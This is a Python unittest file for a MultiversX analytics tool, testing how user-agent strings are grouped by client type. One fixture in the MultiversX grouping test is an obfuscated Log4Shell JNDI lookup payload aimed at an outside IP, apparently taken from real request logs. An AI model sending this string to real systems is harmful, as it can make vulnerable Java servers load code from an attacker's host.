import unittest

from multiversx_usage_analytics_tool.utils import UserAgentGroups


class TestUserAgentGroups(unittest.TestCase):
    def test_python_grouping(self):
        key = "python-requests/2.24.0"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.PYTHON.value)
        self.assertEqual(UserAgentGroups.find(key), 'python-requests/2')

        key = "Python/3.11"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.PYTHON.value)
        self.assertEqual(UserAgentGroups.find(key), 'Python/3')

        key = "Python/3.9 aiohttp/3.9.5"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.PYTHON.value)
        self.assertEqual(UserAgentGroups.find(key), 'Python/3')

    def test_axios_grouping(self):
        key = "axios/0.26.1"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.AXIOS.value)
        self.assertEqual(UserAgentGroups.find(key), 'axios/0')

        key = "axios/1.6.7"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.AXIOS.value)
        self.assertEqual(UserAgentGroups.find(key), 'axios/1')

    def test_okhttp_grouping(self):
        key = "okhttp/3.14.2"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.OKHTTP.value)
        self.assertEqual(UserAgentGroups.find(key), 'okhttp/3')

    def test_apache_grouping(self):
        key = "Apache-HttpClient/4.5.14 (Java/1.8.0_341)"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.APACHE.value)
        self.assertEqual(UserAgentGroups.find(key), 'Apache-HttpClient/4')

    def test_curl_grouping(self):
        key = "curl/7.68.0"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.CURL.value)
        self.assertEqual(UserAgentGroups.find(key), 'curl/7')

        key = "UnityPlayer/2021.3.0f1 (UnityWebRequest/1.0, libcurl/7.80.0-DEV)"
        self.assertNotEqual(UserAgentGroups.get_group(key), UserAgentGroups.CURL.value)
        key = "GuzzleHttp/6.4.1 curl/7.64.0 PHP/7.2.21"
        self.assertNotEqual(UserAgentGroups.get_group(key), UserAgentGroups.CURL.value)

    def test_multiversx_grouping(self):
        key = "MultiversX/1.0.1 (GO SDK tools)"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.MULTIVERSX.value)
        self.assertEqual(UserAgentGroups.find(key), key)

        key = "MultiversX/1.0.1 (GO SDK tools)"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.MULTIVERSX.value)
        self.assertEqual(UserAgentGroups.find(key), key)

        key = "multiversx-sdk/proxy/unknown"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.MULTIVERSX.value)
        self.assertEqual(UserAgentGroups.find(key), key)

        key = "multiversx-sdk/proxy/mvx-stay-guarded"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.MULTIVERSX.value)
        self.assertEqual(UserAgentGroups.find(key), key)

        key = "multiversx-sdk/proxy/mx-sdk-js-core/tests"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.MULTIVERSX.value)
        self.assertEqual(UserAgentGroups.find(key), key)

        key = "${jndi${azaz:atkpll:-:}ldap://161.35.184.54:53/useragentgateway.multiversx.com}"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.MULTIVERSX.value)
        self.assertEqual(UserAgentGroups.find(key), key)

    def test_browser_grouping(self):
        key = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.BROWSER.value)
        self.assertEqual(UserAgentGroups.find(key), UserAgentGroups.BROWSER.value.group_name)

        key = "Safari/19618.1.15.11.14 CFNetwork/1494.0.7 Darwin/23.4.0"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.BROWSER.value)
        self.assertEqual(UserAgentGroups.find(key), UserAgentGroups.BROWSER.value.group_name)

        key = "Opera/8.51 (Macintosh; PPC Mac OS X; U; de)"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.BROWSER.value)
        self.assertEqual(UserAgentGroups.find(key), UserAgentGroups.BROWSER.value.group_name)

        key = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36"
        self.assertNotEqual(UserAgentGroups.get_group(key), UserAgentGroups.BROWSER.value)
        key = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
        self.assertNotEqual(UserAgentGroups.get_group(key), UserAgentGroups.BROWSER.value)
        key = "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot"
        self.assertNotEqual(UserAgentGroups.get_group(key), UserAgentGroups.BROWSER.value)

    def test_mobile_grouping(self):
        key = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.MOBILE_IOS.value)
        self.assertEqual(UserAgentGroups.find(key), UserAgentGroups.MOBILE_IOS.value.group_name)

        key = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.MOBILE_ANDROID.value)
        self.assertEqual(UserAgentGroups.find(key), UserAgentGroups.MOBILE_ANDROID.value.group_name)

        key = "Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko)  +https://support.google.com/webmasters/answer/1061943)"
        self.assertNotEqual(UserAgentGroups.get_group(key), UserAgentGroups.MOBILE_ANDROID.value)

    def test_url_grouping(self):
        key = "Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko)  +https://support.google.com/webmasters/answer/1061943)"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.HTTPS.value)
        self.assertEqual(UserAgentGroups.find(key), 'URL: https://support.google.com/webmasters/answer/1061943')

        key = "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.HTTPS.value)
        self.assertEqual(UserAgentGroups.find(key), 'URL: http://ahrefs.com/robot/')

        key = "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/100.0.4896.127 Safari/537.36"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.HTTPS.value)
        self.assertEqual(UserAgentGroups.find(key), 'URL: http://www.bing.com/bingbot.htm')

        key = "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; ChatGPT-User/1.0; +https://openai.com/bot"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.HTTPS.value)
        self.assertEqual(UserAgentGroups.find(key), 'URL: https://openai.com/bot')

    def test_other_grouping(self):
        key = "@@0GgYP"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.OTHER.value)
        self.assertEqual(UserAgentGroups.find(key), UserAgentGroups.OTHER.value.group_name)

    def test_unknown_grouping(self):
        key = "Slackbot 1.0 (+https://api.slack.com/robots)"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.UNKNOWN.value)
        self.assertEqual(UserAgentGroups.find(key), key)

        key = "Go-http-client/2.0"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.UNKNOWN.value)
        self.assertEqual(UserAgentGroups.find(key), key)

        key = "GuzzleHttp/6.4.1 curl/7.47.0 PHP/7.2.21-1+ubuntu16.04.1+deb.sury.org+1"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.UNKNOWN.value)
        self.assertEqual(UserAgentGroups.find(key), key)

        key = "node-fetch/1.0 (+https://github.com/bitinn/node-fetch)"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.UNKNOWN.value)
        self.assertEqual(UserAgentGroups.find(key), key)

        key = "Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K)"
        self.assertEqual(UserAgentGroups.get_group(key), UserAgentGroups.UNKNOWN.value)
        self.assertEqual(UserAgentGroups.find(key), key)


if __name__ == '__main__':
    unittest.main()
